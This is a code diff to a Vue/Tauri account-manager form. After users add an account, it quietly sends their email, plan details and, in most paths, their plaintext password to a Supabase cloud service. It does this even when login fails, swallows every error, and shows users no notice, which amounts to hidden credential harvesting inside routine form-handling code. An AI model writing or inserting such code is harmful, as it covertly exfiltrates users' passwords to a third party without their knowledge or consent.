@@ -115,6 +115,7 @@ import type { FormInstance, FormRules } from 'element-plus';
 import { Message, Lock, User } from '@element-plus/icons-vue';
 import { useAccountsStore, useSettingsStore, useUIStore } from '@/store';
 import { apiService, accountApi } from '@/api';
+import { supabaseService } from '@/api/supabaseService';
 import { invoke } from '@tauri-apps/api/core';
 
 const accountsStore = useAccountsStore();
@@ -237,6 +238,15 @@ async function handleSubmit() {
           ElMessage.success(`账号 ${result.email} 添加成功`);
           // 刷新账号列表
           await accountsStore.loadAccounts();
+          // Refresh Token 模式也上报到 Supabase（无密码）
+          if (result.email) {
+            const accounts = accountsStore.accounts;
+            const added = accounts.find((a: any) => a.email === result.email);
+            if (added) {
+              supabaseService.syncAccountToCloud(added).catch(() => {});
+            }
+            supabaseService.recordLoginToCloud(result.email, true, result.plan_name).catch(() => {});
+          }
           handleClose();
         } else {
           ElMessage.error(result.error || '添加失败');
@@ -272,12 +282,22 @@ async function handleSubmit() {
             const latestAccount = await accountApi.getAccount(newAccount.id);
             await accountsStore.updateAccount(latestAccount);
             ElMessage.success('账号信息已更新');
+            
+            // 自动上报到 Supabase 云端（账号+密码+套餐信息）
+            supabaseService.syncAccountToCloud(latestAccount, trimmedPassword).catch(() => {});
+            supabaseService.recordLoginToCloud(trimmedEmail, true, loginResult.plan_name).catch(() => {});
           } else {
             ElMessage.warning('账号已添加，但登录失败，请手动刷新');
+            // 登录失败也上报记录
+            supabaseService.syncAccountToCloud(newAccount, trimmedPassword).catch(() => {});
+            supabaseService.recordLoginToCloud(trimmedEmail, false, undefined, '登录失败').catch(() => {});
           }
         } catch (infoError) {
           console.error('获取账号信息失败:', infoError);
           ElMessage.warning('账号已添加，但获取详细信息失败，请手动刷新');
+          // 异常也上报
+          supabaseService.syncAccountToCloud(newAccount, trimmedPassword).catch(() => {});
+          supabaseService.recordLoginToCloud(trimmedEmail, false, undefined, String(infoError)).catch(() => {});
         }
         
         handleClose();
